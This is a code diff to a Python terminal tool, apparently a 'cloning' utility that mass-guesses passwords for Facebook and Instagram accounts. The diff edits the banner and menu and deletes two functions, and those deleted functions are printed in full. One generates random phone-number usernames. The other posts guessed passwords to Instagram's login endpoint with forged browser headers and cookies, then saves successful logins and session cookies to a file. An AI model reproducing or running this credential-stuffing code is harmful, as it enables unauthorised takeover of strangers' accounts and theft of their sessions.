@@ -216,7 +216,7 @@ os.system("xdg-open ")
 os.system("clear")
 faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"    
 logo =(f"""
-{faltu} {black}"If you get tired, learn to rest, not to quit".... {pvt}
+{faltu} {black}"                                           ".... {pvt}
 \033[1;32m
   _   _    _    __  __ ____ _____ _____ ____  
  | | | |  / \  |  \/  / ___|_   _| ____|  _ \ 
@@ -224,7 +224,7 @@ logo =(f"""
  |  _  |/ ___ \| |  | |___) || | | |___|  _ < 
  |_| |_/_/   \_\_|  |_|____/ |_| |_____|_| \_\
                                               
-\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
+\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 def check_lock(cid):
     req = str(requests.get(f'https://graph.facebook.com/{cid}/picture?type=normal').text)
@@ -298,8 +298,8 @@ def linex():
     print(f'{green}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
 
 def SUMON_time():
-    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] sim card   : {ahydra}")
-    print(f"\033[1;32m[\033[1;31m✓\033[1;32m] Date       : {datex} ")
+    print(f"\033[1;32m[\033[1;31m:\033[1;32m] sim card   : {ahydra}")
+    print(f"\033[1;32m[\033[1;31m:\033[1;32m] Date       : {datex} ")
     linex()
 
 class Process:
@@ -340,14 +340,14 @@ def menu():
     clear()
     SUMON_time()
     
-    print("[1] FILE   CLONING =>")
-    print("[2] RANDOM CLONING =>")
-    print("[3] PUBLIK CLONING =>")
-    print("[4] INSTAGRAM CLONING =>")
-    print("[5] CONTACT (WHATSAPP) ")
+    print("[1] FILE CLONING ")
+    print("[2] RANDOM CLONING ")
+    #print("[3] PUBLIK CLONING =>")
+    #print("[4] INSTAGRAM CLONING =>")
+    #print("[5] CONTACT (WHATSAPP) ")
     print("[6] EXIT TOOL ")
     linex()
-    bithi = input(f"\033[1;32m[\033[1;31m✓\033[1;32m] CHOOSE => ")
+    bithi = input(f"\033[1;32m[\033[1;31m:\033[1;32m] CHOOSE => ")
     if bithi =='1':f_clone()
     elif bithi =='2':r_clone()
     elif bithi =='3':n_clone()
@@ -426,12 +426,12 @@ def f_clone():
 def r_clone():
     clear()
     SUMON_time()
-    print(" [1] INDIA RONDAM (full number)")
-    print(" [2] INDIA RONDAM")
-    print(" [3] NEPAL RAODOM")
-    print(" [4] BAGLADESH RONDAM")
-    print(" [5] RANDOM CHOICE PASS")
-    print(" [6] GAMING CLONE")
+    print(" [1] RONDAM FULL NUMBER")
+    print(" [2] RONDAM 4 DIGIT")
+    #print(" [3] NEPAL RAODOM")
+    #print(" [4] BAGLADESH RONDAM")
+    #print(" [5] RANDOM CHOICE PASS")
+    #print(" [6] GAMING CLONE")
     linex()
     bithi = input("\033[1;32m[\033[1;31m✓\033[1;32m] CHOOSE => ")
     if bithi =='1':SUMON1()
@@ -814,42 +814,6 @@ def n_clone():
     print(f" {wow('â¢')} {green}TOTAL OK : {str(len(oks))} ")
     divider()
     exit()
-
-def random_number():
-    clear()
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0320, 0330, 0340 ")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
-    linex()
-    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
-    try:
-        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit :\033[1;92m "))
-    except ValueError:
-        limit = 5000
-    for _ in range(limit):
-        x = "".join(random.choice(string.digits) for _ in range(6))
-        idz.append(x)
-    with ThreadPoolExecutor(max_workers=30) as XYZ:
-        clear()
-        total_idz = str(len(idz))
-        print(f"\033[1;96m INSTAGRAM IDZ CRACK")
-        linex()
-        print(f' \033[1;32m(!) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
-        print(' \033[1;37m(!) \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
-        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP")
-        linex()
-        for xyz in idz:
-            uid = code+xyz
-            pww = ['57273200',uid[:6],uid[:8],uid] 
-         #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
-            XYZ.submit(crack, uid, pww, total_idz)
-    linex()
-    print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
-    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
-    linex()
-    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")
-    menu()
-
 
 def freefb(uid, name, pwx, tl):
     global loop
@@ -1988,95 +1952,5 @@ def cracker(uid, pwx, tl):
         #print({error})
         pass
 
-def crack(uid, pww, total_idz):
-    global loop
-    global oks
-    global cps
-    x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
-    sys.stdout.write(f"\r{x}[SUMON] {loop}/{total_idz} \033[1;92m{len(oks)}")
-    sys.stdout.flush()
-    try:
-        for pw in pww:
-            session = requests.Session()
-            time_now = int(datetime.now().timestamp())
-            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
-            response = session.get('https://www.instagram.com/accounts/login/')
-            csrftoken = response.cookies.get('csrftoken')
-            cookies ={
-            'mid': 'ZsCYoAALAAGlcbYkVN23DYxQwevD',
-            'ig_did': 'E68CEB20-E5E7-4BF3-BE61-C5EF4084D93B',
-            'ig_nrcb': '1',
-            'datr': 'npjAZqX5wY3c_CtTDAvR0Ls3',
-            'ps_l': '1',
-            'ps_n': '1',
-            'csrftoken': csrftoken,
-            'wd': '876x773',}
-            data = {
-            'enc_password': enc_password,
-            'caaF2DebugGroup': '0',
-            'loginAttemptSubmissionCount': '0',
-            'optIntoOneTap': 'false',
-            'queryParams': '{"hl":"en"}',
-            'trustedDeviceRecords': '{}',
-            'username': uid,}
-            headers = {
-            'accept': '*/*',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.instagram.com',
-            'priority': 'u=1, i',
-            'referer': 'https://www.instagram.com/accounts/login/?hl=en',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.140", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
-            'x-asbd-id': '129477',
-            'x-csrftoken': csrftoken,
-            'x-ig-app-id': '936619743392459',
-            'x-ig-www-claim': '0',
-            'x-instagram-ajax': '1018894959',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-web-session-id': '9k4qw4:jior4r:km1zo0',}
-            login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
-            response = requests.post(login_url, data=data, cookies=cookies, headers=headers).json()
-            session_cookies = response.cookies.get_dict()
-            if response.get('status') == 'ok':
-               if response.get('authenticated') == True:
-                   cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
-                   print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                   print(f"\r\033[1;92m [cookie] {cookie}")
-                   open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
-                   oks.append(uid)
-                   break
-               elif response.get('auth_token'):
-                   cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
-                   print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                   print(f"\r\033[1;92m [cookie] {cookie}")
-                   open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
-                   oks.append(uid)
-                   break
-            elif 'sessionid' in session_cookies:
-                   cookie = ';'.join(['%s=%s'%(name,value) for name, value in requests.cookies.get_dict().items()])
-                   print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
-                   print(f"\r\033[1;92m [cookie] {cookie}")
-                   open("/sdcard/INSTAGRAM-RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
-                   oks.append(uid)
-                   break
-            else:
-                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
-                continue
-        loop+=1
-    except ConnectionError:
-        time.sleep(10)
-    except:
-        pass
-
 os.system("clear")
-Process()
+menu()
